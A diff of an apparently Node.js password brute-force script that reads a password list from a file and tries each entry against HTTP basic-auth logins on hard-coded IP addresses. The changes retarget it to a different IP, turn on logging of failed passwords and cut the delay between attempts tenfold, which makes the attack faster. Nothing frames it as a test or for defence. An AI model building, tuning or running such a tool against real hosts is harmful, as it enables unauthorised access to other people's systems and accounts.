@@ -38,7 +38,7 @@ var s = fs.createReadStream('./passwords.txt')
 	.on('end', function(){
 		console.log('Read file end, start spider');
 		//startSpider();
-		login('119.246.149.245','http://119.246.149.245');
+		login('138.19.85.253','http://138.19.85.253');
 	})
 );
 
@@ -104,9 +104,9 @@ function login(url,link) {
 					console.log(url + " password found : " + pw);
 					finish = true;
 				} else if(!error && response.statusCode == 401) {
-					//console.log(url + " incorrect pw : " + pw);
+					console.log(url + " incorrect pw : " + pw);
 
-					sleep.usleep(10000);
+					sleep.usleep(1000);
 					
 					pwInd++;
 
@@ -120,7 +120,7 @@ function login(url,link) {
 					}
 					} catch(e) {}
 
-                    sleep.usleep(10000);
+                    sleep.usleep(1000);
 
 					try{
                     login2();
